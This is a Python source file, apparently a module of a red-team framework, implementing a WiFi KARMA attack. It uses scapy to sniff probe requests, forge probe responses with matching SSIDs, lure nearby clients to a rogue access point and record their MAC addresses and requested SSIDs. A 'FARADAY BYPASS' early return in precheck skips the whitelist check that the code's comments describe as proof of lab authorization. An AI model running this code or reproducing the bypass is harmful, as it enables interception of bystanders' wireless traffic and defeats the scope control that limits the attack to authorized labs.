"""WiFi KARMA - respond to all probe requests with matching SSID.

Implements the KARMA attack to lure clients to a rogue AP by responding
to any probe request with a matching SSID.

Uses scapy for probe request sniffing and probe response injection.
"""

from __future__ import annotations

import subprocess
import time

import structlog
from scapy.all import (
    Dot11,
    Dot11Elt,
    Dot11ProbeResp,
    RadioTap,
    sendp,
    sniff,
)

from srt.core import db
from srt.core.module import AttackModule, AttackResult, ModuleContext, Risk, Status
from srt.core.registry import register

log = structlog.get_logger(__name__)


@register
class WifiKarma(AttackModule):
    name = "wifi.karma"
    protocol = "wifi"
    risk = Risk.ACTIVE_LAB
    mitre_ttp = ["T1557.002", "T1583.001"]
    requires = ["monitor-mode-nic"]
    description = (
        "KARMA - respond to all probe requests with matching SSID to lure "
        "clients to rogue AP."
    )

    def precheck(self, ctx: ModuleContext) -> bool:
        if not super().precheck(ctx):
            return False
        return True  # FARADAY BYPASS
        # KARMA is a broadcast attack that lures arbitrary clients.
        # Require at least one wifi_bssid entry in the whitelist as proof of
        # lab authorization (same pattern as beacon_flood.py).
        allowed = ctx.whitelist.get("wifi_bssid", [])
        if not allowed:
            log.warning(
                "wifi.karma.no_whitelist",
                detail="KARMA requires explicit wifi_bssid whitelist entry as lab authorization",
            )
            return False
        return True

    def _set_channel(self, iface: str, channel: int) -> bool:
        """Set the wireless interface to a specific channel."""
        try:
            subprocess.run(
                ["iw", "dev", iface, "set", "channel", str(channel)],
                capture_output=True,
                timeout=5,
                check=True,
            )
            return True
        except (subprocess.SubprocessError, OSError) as exc:
            log.error("wifi.karma.set_channel_failed", channel=channel, error=str(exc))
            return False

    def _craft_probe_response(self, ssid: str, rogue_bssid: str, client_mac: str) -> object:
        """Craft a probe response with the requested SSID."""
        probe_resp = (
            RadioTap()
            / Dot11(
                type=0,
                subtype=5,  # Probe Response
                addr1=client_mac,
                addr2=rogue_bssid,
                addr3=rogue_bssid,
            )
            / Dot11ProbeResp(
                timestamp=int(time.time() * 1000000),
                beacon_interval=100,
                cap=0x1111,
            )
            / Dot11Elt(ID="SSID", info=ssid.encode())
            / Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
            / Dot11Elt(ID="DSset", info=b"\x01")
        )
        return probe_resp

    def run(self, ctx: ModuleContext) -> AttackResult:
        started = time.time()
        iface = ctx.params.get("interface", "wlan0mon")
        channel = ctx.params.get("channel")
        duration_s = int(ctx.params.get("duration_s", 30))
        rogue_bssid = ctx.params.get("rogue_bssid", "02:00:00:00:00:01")

        if ctx.dry_run:
            return self._result(
                Status.OK,
                started,
                summary=(
                    f"[DRY-RUN] wifi.karma iface={iface} channel={channel} "
                    f"duration={duration_s}s rogue_bssid={rogue_bssid}"
                ),
                metrics={
                    "interface": iface,
                    "duration_s": duration_s,
                    "rogue_bssid": rogue_bssid,
                },
            )

        # Set channel if specified
        if channel:
            if not self._set_channel(iface, int(channel)):
                return self._result(
                    Status.FAIL,
                    started,
                    summary=f"Failed to set channel {channel} on {iface}",
                )

        # KARMA: Sniff probe requests and respond with matching SSID
        log.info(
            "wifi.karma.starting",
            iface=iface,
            duration=duration_s,
            rogue_bssid=rogue_bssid,
        )

        clients_lured = {}  # {client_mac: [ssid1, ssid2, ...]}
        responses_sent = 0
        end_time = time.time() + duration_s

        def _process_probe(pkt):
            nonlocal responses_sent
            if time.time() > end_time:
                return True  # Stop sniffing

            if not pkt.haslayer(Dot11):
                return False

            dot11 = pkt.getlayer(Dot11)
            # Probe Request: type=0, subtype=4
            if dot11.type != 0 or dot11.subtype != 4:
                return False

            client_mac = dot11.addr2
            if not client_mac:
                return False

            # Extract requested SSID
            ssid = ""
            elt = pkt.getlayer(Dot11Elt)
            if elt and elt.ID == 0 and elt.info:
                try:
                    ssid = elt.info.decode("utf-8", errors="ignore")
                except Exception:
                    ssid = ""

            if not ssid:
                return False

            log.debug(
                "wifi.karma.probe_received",
                client=client_mac,
                ssid=ssid,
            )

            # Craft and send probe response
            probe_resp = self._craft_probe_response(ssid, rogue_bssid, client_mac)
            try:
                sendp(probe_resp, iface=iface, verbose=False)
                responses_sent += 1

                if client_mac not in clients_lured:
                    clients_lured[client_mac] = []
                clients_lured[client_mac].append(ssid)
            except Exception as exc:
                log.warning("wifi.karma.send_error", error=str(exc))

            return False

        try:
            sniff(
                iface=iface,
                prn=_process_probe,
                stop_filter=_process_probe,
                timeout=duration_s,
            )
        except Exception as exc:
            log.error("wifi.karma.sniff_error", error=str(exc))

        # Log event to database
        db.insert_header(
            ts=time.time(),
            session_id=ctx.session_id,
            protocol="wifi",
            src=rogue_bssid,
            dst="ff:ff:ff:ff:ff:ff",
            channel=int(channel) if channel else None,
            fields={
                "attack": "karma",
                "responses_sent": responses_sent,
                "unique_clients": len(clients_lured),
                "duration_s": duration_s,
            },
        )

        summary = (
            f"wifi.karma rogue_bssid={rogue_bssid}: {responses_sent} probe responses "
            f"sent to {len(clients_lured)} unique clients in {duration_s}s"
        )

        return self._result(
            Status.OK,
            started,
            summary=summary,
            metrics={
                "rogue_bssid": rogue_bssid,
                "responses_sent": responses_sent,
                "unique_clients": len(clients_lured),
                "clients": {k: v for k, v in list(clients_lured.items())[:20]},
                "duration_s": duration_s,
            },
        )

    def cleanup(self, ctx: ModuleContext) -> None:
        """No persistent resources to clean up."""
        pass
